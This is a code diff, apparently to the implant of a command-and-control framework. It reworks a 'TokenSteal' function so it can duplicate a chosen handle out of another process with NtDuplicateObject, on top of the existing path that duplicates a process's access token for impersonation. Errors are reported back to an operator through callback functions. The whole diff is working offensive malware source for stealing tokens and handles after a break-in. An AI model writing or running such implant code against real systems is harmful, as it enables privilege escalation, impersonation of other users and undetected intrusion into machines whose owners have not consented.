@@ -113,41 +113,67 @@ DWORD TokenAdd( HANDLE hToken, LPSTR DomainUser, SHORT Type, DWORD dwProcessID, 
     return TokenIndex;
 }
 
-HANDLE TokenSteal( DWORD ProcessID )
+HANDLE TokenSteal( DWORD ProcessID, HANDLE TargetHandle )
 {
-    HANDLE   hProcess  = NULL;
-    HANDLE   hToken    = NULL;
-    HANDLE   hTokenDup = NULL;
-    NTSTATUS NtStatus  = STATUS_SUCCESS;
+    HANDLE            hProcess  = NULL;
+    HANDLE            hToken    = NULL;
+    HANDLE            hTokenDup = NULL;
+    NTSTATUS          NtStatus  = STATUS_SUCCESS;
+    CLIENT_ID         ProcID    = { 0 };
+    OBJECT_ATTRIBUTES ObjAttr   = { sizeof( ObjAttr ) };
 
-    hProcess = ProcessOpen( ProcessID, PROCESS_QUERY_LIMITED_INFORMATION );
-    if ( hProcess )
+    if ( TargetHandle )
     {
-        if ( NT_SUCCESS( NtStatus = Instance.Syscall.NtOpenProcessToken( hProcess, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &hToken ) ) )
+        PRINTF( "Stealing handle 0x%x from PID %d\n", TargetHandle, ProcessID );
+        ProcID.UniqueProcess = ProcessID;
+        NtStatus = Instance.Syscall.NtOpenProcess( &hProcess, MAXIMUM_ALLOWED, &ObjAttr, &ProcID );
+        if ( NT_SUCCESS( NtStatus ) )
         {
-            if ( ! Win32_DuplicateTokenEx(
-                        hToken,
-                        TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY,
-                        NULL,
-                        SecurityImpersonation | SecurityIdentification, TokenPrimary, &hTokenDup
-                    )
-                )
+            NtStatus = Instance.Syscall.NtDuplicateObject( hProcess, TargetHandle, NtCurrentProcess( ), &hTokenDup, 0, 0, DUPLICATE_SAME_ACCESS );
+            if ( ! NT_SUCCESS( NtStatus ) )
             {
-                PRINTF( "[!] DuplicateTokenEx() error : % u\n", NtGetLastError()) ;
-                CALLBACK_GETLASTERROR
+                PRINTF( "NtDuplicateObject: Failed:[%ld : %ld]", NtStatus, Instance.Win32.RtlNtStatusToDosError( NtStatus ) )
+                PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
             }
-            else PRINTF( "Successful duplicated token: %x\n", hToken )
         }
         else
         {
-            PRINTF( "NtOpenProcessToken: Failed:[%ld : %ld]", NtStatus, Instance.Win32.RtlNtStatusToDosError( NtStatus ) )
+            PRINTF( "NtOpenProcess: Failed:[%ld : %ld]", NtStatus, Instance.Win32.RtlNtStatusToDosError( NtStatus ) )
             PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
         }
     }
     else
     {
-        PRINTF( "ProcessOpen: Failed:[%ld]\n", NtGetLastError() )
-        PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
+        PRINTF( "Stealing process handle from PID %d\n", ProcessID );
+        hProcess = ProcessOpen( ProcessID, PROCESS_QUERY_LIMITED_INFORMATION );
+        if ( hProcess )
+        {
+            if ( NT_SUCCESS( NtStatus = Instance.Syscall.NtOpenProcessToken( hProcess, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &hToken ) ) )
+            {
+                if ( ! Win32_DuplicateTokenEx(
+                            hToken,
+                            TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY,
+                            NULL,
+                            SecurityImpersonation | SecurityIdentification, TokenPrimary, &hTokenDup
+                        )
+                    )
+                {
+                    PRINTF( "[!] DuplicateTokenEx() error : % u\n", NtGetLastError()) ;
+                    CALLBACK_GETLASTERROR
+                }
+                else PRINTF( "Successful duplicated token: %x\n", hToken )
+            }
+            else
+            {
+                PRINTF( "NtOpenProcessToken: Failed:[%ld : %ld]", NtStatus, Instance.Win32.RtlNtStatusToDosError( NtStatus ) )
+                PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
+            }
+        }
+        else
+        {
+            PRINTF( "ProcessOpen: Failed:[%ld]\n", NtGetLastError() )
+            PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
+        }
     }
 
     if ( hToken )
